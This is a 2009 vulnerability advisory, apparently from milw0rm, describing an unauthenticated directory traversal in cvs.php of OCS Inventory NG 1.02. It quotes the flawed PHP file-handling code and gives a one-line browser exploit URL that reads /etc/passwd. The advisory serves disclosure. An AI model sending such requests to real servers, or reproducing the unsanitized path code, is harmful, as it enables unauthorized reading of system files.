@@ -1,0 +1,54 @@
+OCS Inventory NG - Directory Traversal  (May 30 2009)
+_______________________________________________________________________________
+
+
+* Product
+
+  Open Computer and Software (OCS) Inventory NG
+  (http://www.ocsinventory-ng.org)
+
+
+* Vulnerable Versions
+
+  OCS Inventory NG 1.02 (Unix)
+
+
+* Vendor Status
+
+  Vendor has been notified and the vulnerability has been fixed in
+version 1.02.1.
+
+
+* Details
+
+  The Open Computer and Software (OCS) Inventory Next Generation (NG)
+provides relevant inventory information about system configurations and
+software on the network. The server can be managed using a web
+interface. It is possible for unauthenticated users to extract arbitrary
+files from the hosting system due to inadequate file handling in cvs.php.
+
+  cvs.php:
+
+		} elseif (isset($_GET['log'])){
+			if (file_exists($_GET['rep'].$_GET['log'])){
+				$tab = file($_GET['rep'].$_GET['log']);
+				while(list($cle,$val) = each($tab)) {
+		 		  $toBeWritten  .= $val."\r\n";
+				}
+				$filename=$_GET['log'];
+			}
+		}
+
+
+* Impact
+
+  Attackers may be able to read arbitrary files from the hosting system.
+
+
+* Exploit
+
+  The vulnerability can be exploited by just using a web browser:
+
+	http://example.org/ocsreports/cvs.php?log=/etc/passwd
+
+# milw0rm.com [2009-06-03]
